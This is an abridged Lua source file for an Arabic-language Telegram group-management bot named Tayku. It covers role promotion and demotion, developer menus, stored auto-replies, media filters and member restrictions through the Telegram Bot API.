tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevLeo:get(Tayku.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevLeo:sadd(Tayku..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevLeo:sadd(Tayku..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevLeo:sadd(Tayku..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevLeo:srem(Tayku..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevLeo:srem(Tayku..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevLeo:sismember(Tayku.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevLeo:get(Tayku.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevLeo:sadd(Tayku..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevLeo:sadd(Tayku..'Rio:Admins:'..msg.chat_id_, result.id_)
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevLeo:sadd(Tayku..'Rio:Managers:'..msg.chat_id_, result.id_)
DevLeo:set(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevLeo:srem(Tayku..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_, result.id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevLeo:srem(Tayku..'Rio:Managers:'..msg.chat_id_, result.id_)
DevLeo:del(Tayku.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'lllEll0')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevLeo:incr(Tayku..'Rio:UsersMsgs'..Tayku..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevLeo:incr(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevLeo:incr(Tayku..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevLeo:sismember(Tayku.."Rio:Users",msg.chat_id_) then
DevLeo:sadd(Tayku.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس تايكو فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس تايكو فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
...
if not DevLeo:get(Tayku..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "lllEll0")}},
{{text="᥀ السورس .",url="https://t.me/lllEll0"},{text="᥀ لتنصيب بوت .",url="https://t.me/lllEll1"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevLeo:get(Tayku.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevLeo:setex(Tayku..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Tayku     --
if not SecondSudo(msg) and not DevLeo:sismember(Tayku..'Rio:Ban:Pv',msg.sender_user_id_) and not DevLeo:get(Tayku..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "lllEll0")..')', 1, 'md') 
...
DevLeo:sadd(Tayku..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevLeo:srem(Tayku..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source Tayku     --
if text and DevLeo:get(Tayku..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevLeo:del(Tayku..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevLeo:set(Tayku.."Rio:Start:Bot",text)  
...
DevLeo:set(Tayku..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevLeo:del(Tayku.."Rio:Lock:AutoFile")
end
...
DevLeo:set(Tayku.."Rio:Lock:AutoFile",true) 
end
end
end
--     Source Tayku     --
...
local TaykuTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..TaykuTeam[math.random(#TaykuTeam)]..'' , 1, 'md')  
return false
end
--     Source Tayku     --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or lllEll0}}}
...
local my_ph = DevLeo:get(Tayku.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevLeo:get(Tayku..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
{{text = '᥀ Tayku Team .', url="t.me/lllEll0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
DevLeo:incr(Tayku..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevLeo:set(Tayku.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevLeo:get(Tayku.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevLeo:sadd(Tayku..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Tayku) then 
DevLeo:srem(Tayku.."Rio:Groups", msg.chat_id_) 
...
if DevLeo:get(Tayku..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevLeo:incr(Tayku..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevLeo:incr(Tayku..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Tayku     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevLeo:get(Tayku..'Rio:Lock:FreeBot'..Tayku) then
if ChatType == 'pv' then
...
DevLeo:sadd(Tayku..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevLeo:srem(Tayku..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevLeo:sadd(Tayku..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevLeo:sadd(Tayku.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevLeo:sadd(Tayku.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevLeo:srem(Tayku.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevLeo:srem(Tayku.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevLeo:sismember(Tayku..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevLeo:get(Tayku..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevLeo:get(Tayku..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevLeo:sadd(Tayku.."Rio:Groups",msg.chat_id_)
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevLeo:set(Tayku.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevLeo:set(Tayku..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Tayku     --
local ReFalse = tostring(msg.chat_id_)
if not DevLeo:sismember(Tayku.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevLeo:get(Tayku..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevLeo:sadd(Tayku..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevLeo:get(Tayku.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevLeo:smembers(Tayku.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevLeo:smembers(Tayku.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevLeo:smembers(Tayku.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevLeo:get(Tayku..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevLeo:del(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevLeo:srem(Tayku..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevLeo:del(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevLeo:get(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevLeo:del(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevLeo:get(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevLeo:del(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
DevLeo:del(Tayku.."Rio:Gif:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Voice:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Audio:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Photo:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Stecker:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Video:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:File:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Text:AllRed"..msg.content_.text_)
DevLeo:del(Tayku.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Tayku     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevLeo:get(Tayku..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevLeo:smembers(Tayku..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevLeo:del(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevLeo:sadd(Tayku..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevLeo:sismember(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local TaykuTeam =  DevLeo:smembers(Tayku..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..TaykuTeam[math.random(#TaykuTeam)]..']' , 1, 'md')  
end
end
--     Source Tayku     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevLeo:get(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevLeo:get(Tayku..'DelManagerRep'..msg.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevLeo:del(Tayku..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevLeo:del(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevLeo:del(Tayku..'DelManagerRep'..msg.chat_id_)
return false
end
DevLeo:del(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevLeo:get(Tayku..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevLeo:set(Tayku..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevLeo:set(Tayku..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevLeo:set(Tayku..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevLeo:set(Tayku..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevLeo:set(Tayku..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevLeo:set(Tayku..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevLeo:set(Tayku..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevLeo:set(Tayku..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevLeo:get(Tayku..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevLeo:get(Tayku..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevLeo:get(Tayku..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevLeo:get(Tayku..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevLeo:get(Tayku..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevLeo:get(Tayku..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevLeo:get(Tayku..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevLeo:get(Tayku..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevLeo:get(Tayku..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevLeo:get(Tayku..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevLeo:get(Tayku..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function TaykuTeam(extra,result,success)
